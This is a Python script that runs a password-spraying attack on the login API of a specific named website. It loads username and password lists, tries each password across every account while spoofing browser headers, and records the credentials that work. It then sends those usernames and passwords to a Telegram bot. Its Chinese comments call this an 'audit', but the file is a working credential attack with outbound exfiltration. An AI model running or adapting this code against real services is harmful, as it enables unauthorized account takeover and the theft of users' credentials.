import os
import requests
import time

LOGIN_URL = "https://xn--4gq62f52gdss.com/api/v1/passport/auth/login"
BASE_DOMAIN = "https://xn--4gq62f52gdss.com"

USER_FIELD = "email"
PWD_FIELD = "password"
REQUEST_INTERVAL = 0.2
REQUEST_TIMEOUT = (3, 6)
MAX_RUNTIME_MINUTES = 350
RESULT_FILE_PATH = "success_log.txt"
SUMMARY_TXT_PATH = "success_summary.txt"

# ==================== Telegram 配置 ====================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

def send_telegram_file(file_path):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] 未配置 Telegram 密钥，跳过文件发送")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 *审计运行结果汇总文件*"}
            res = requests.post(url, data=data, files=files, timeout=10)
            if res.status_code == 200:
                print("[+] Telegram TXT 文件发送成功")
            else:
                print(f"[!] Telegram 文件发送失败，返回响应: {res.text}")
    except Exception as e:
        print(f"[!] Telegram 文件发送异常: {e}")

def get_accounts():
    if os.path.exists("users.txt"):
        with open("users.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def get_passwords():
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def is_login_success(response):
    if response.status_code != 200:
        return False
    try:
        data = response.json()
        if isinstance(data, dict):
            if "auth_data" in data or (isinstance(data.get("data"), dict) and "auth_data" in data["data"]):
                return True
            if data.get("status") == "success" or data.get("code") in [200, 0, "200", "success"]:
                return True
    except ValueError:
        pass
    text = response.text.lower()
    if "auth_data" in text or '"status":"success"' in text:
        return True
    return False

def main():
    usernames = get_accounts()
    passwords = get_passwords()
    
    if not usernames or not passwords:
        print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
        return

    for path in [RESULT_FILE_PATH, SUMMARY_TXT_PATH]:
        if os.path.exists(path):
            os.remove(path)

    total_tasks = len(passwords) * len(usernames)
    print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码（总组合数: {total_tasks}）")
    print(f"[*] 模式: 密码优先（所有账号轮流尝试同一个密码）")
    print(f"[*] 目标: {LOGIN_URL}")
    if MAX_RUNTIME_MINUTES:
        print(f"[*] 全局超时限制: {MAX_RUNTIME_MINUTES} 分钟\n")
    else:
        print(f"[*] 全局超时限制: 无\n")

    successful_results = []
    start_time = time.time()
    current_time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    current_count = 0

    with requests.Session() as session:
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Origin": BASE_DOMAIN,
            "Referer": f"{BASE_DOMAIN}/auth/login"
        })

        is_timeout_stopped = False

        for password in passwords:
            if MAX_RUNTIME_MINUTES and (time.time() - start_time) > (MAX_RUNTIME_MINUTES * 60):
                print(f"\n[!] 已达到设定的最大运行时间 ({MAX_RUNTIME_MINUTES} 分钟)，主动中止审计。")
                is_timeout_stopped = True
                break

            print(f"\n[*] ==================== 当前测试密码: {password} ====================")
            
            for username in usernames:
                current_count += 1

                if MAX_RUNTIME_MINUTES and (time.time() - start_time) > (MAX_RUNTIME_MINUTES * 60):
                    print(f"\n[!] 已达到设定的最大运行时间 ({MAX_RUNTIME_MINUTES} 分钟)，主动中止审计。")
                    is_timeout_stopped = True
                    break

                if any(res['username'] == username for res in successful_results):
                    continue

                percent = (current_count / total_tasks) * 100
                elapsed_seconds = int(time.time() - start_time)
                m, s = divmod(elapsed_seconds, 60)
                h, m = divmod(m, 60)
                time_str = f"{h:02d}:{m:02d}:{s:02d}"

                try:
                    payload = {USER_FIELD: username, PWD_FIELD: password}
                    response = session.post(LOGIN_URL, data=payload, timeout=REQUEST_TIMEOUT)

                    print(f"\r[进度 {percent:.2f}%] [{time_str}] 账号:{username} | 状态:{response.status_code}   ", end="", flush=True)

                    if is_login_success(response):
                        print(f"\n\n[+] 【找到正确密码】 {username} -> {password}")
                        success_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                        success_data = {
                            "username": username,
                            "password": password,
                            "time": success_time
                        }
                        successful_results.append(success_data)
                        
                        with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
                            f.write(f"[{success_time}] 成功: 账号={username} ---- 密码={password}\n")
                except requests.exceptions.Timeout:
                    print(f"\r[!] 账号 {username} 请求超时，已跳过" + " "*30)
                except requests.exceptions.RequestException as e:
                    print(f"\r[!] 请求异常: {e}" + " "*30)

                time.sleep(REQUEST_INTERVAL)

            if is_timeout_stopped:
                break

    print("\n")
    summary_content = "=== 审计结果汇总 ===\n\n"
    if is_timeout_stopped:
        summary_content += f"[!] 注意：脚本因达到最大运行时间 ({MAX_RUNTIME_MINUTES}分钟) 而提前终止。\n\n"
        
    if successful_results:
        for item in successful_results:
            summary_content += f"账号: {item['username']} | 密码: {item['password']} | 时间: {item['time']}\n"
    else:
        summary_content += f"审计完成时间: {current_time_str}\n状态: 本次未发现有效凭据。\n"
    
    with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
        f.write(summary_content)
        
    send_telegram_file(SUMMARY_TXT_PATH)
    print(f"\n[*] 全自动审计结束，共找到 {len(successful_results)} 个有效凭据并已打包发送。")

if __name__ == "__main__":
    main()
